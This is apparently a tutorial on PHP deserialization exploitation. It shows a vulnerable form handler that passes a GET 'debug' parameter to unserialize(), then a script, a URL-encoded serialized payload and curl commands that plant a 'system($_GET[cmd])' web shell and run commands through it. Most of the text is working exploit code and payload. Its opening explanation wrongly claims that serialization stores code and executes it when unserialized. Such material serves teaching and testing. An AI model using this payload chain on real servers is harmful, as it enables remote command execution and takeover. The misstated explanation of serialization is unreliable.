# What is?
Alright, now time for the exploitation. Before that, we need to learn what PHP deserialization is and before that, what is serialization?
We use serialization when we want a piece of code or some object to be stored in a database or when we’re expecting some piece of code through an API call or something and then we want to execute it/load it.
If you’re a programmer, you might have come across this hurdle, to solve this, you always need to create a new file, write the source code in it and execute the file manually.
To not do the above^, we use serialization, it takes your piece of code/object, serializes it and stores in the database and while retrieving it, it unserializes the piece of code and executes it.
For the API call, it just receives serialized code already and executes it while unserializing it.

# Code Example:
```
<?php

class FormSubmit {

  public $form_file = 'message.txt';
  public $message = '';

  public function SaveMessage() {

    $NameArea = $_GET['name']; 
    $EmailArea = $_GET['email'];
    $TextArea = $_GET['comments'];

    $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

  }

  public function __destruct() {

    file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
    echo 'Your submission has been successfully saved!';

  }

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>
```

# Explanation:
From the PHP code we see that there is a GET parameter(debug) that deserialize a string given...
http://something.com/index.php?debug=XXXXXXXXXX
//Knowing that we can take part of the code and serialize a PHP web-shell:
```
<?php
class FormSubmit 
{
	public $form_file = 'webshell.php';
	public $message = '<?php system($_GET[cmd]); ?>';
}
$debug = new FormSubmit;
$messageDebug = serialize($debug);
echo $messageDebug;
?>
```

Running script with PHP **serialization.php** will give us a serialized string like this:
```
O:10:"FormSubmit":2:{s:9:"form_file";s:12:"webshell.php";s:7:"message";s:28:"<?php system($_GET[cmd]); ?>";}
```
Convert the serialized string in URL format:
```
O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A12%3A%22webshell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24_GET%5Bcmd%5D%29%3B%20%3F%3E%22%3B%7D
```
Now we can upload the web-shell with deserialization(using the debug parameter in a GET request):
```
curl 'http://something.com/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A12%3A%22webshell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24_GET%5Bcmd%5D%29%3B%20%3F%3E%22%3B%7D' 
```
Now we should be able to curl our file uploaded to http://something.com/webshell.php
and curl commands as a normal php webshell: curl 'http://something.com/webshell?cmd=xxx'
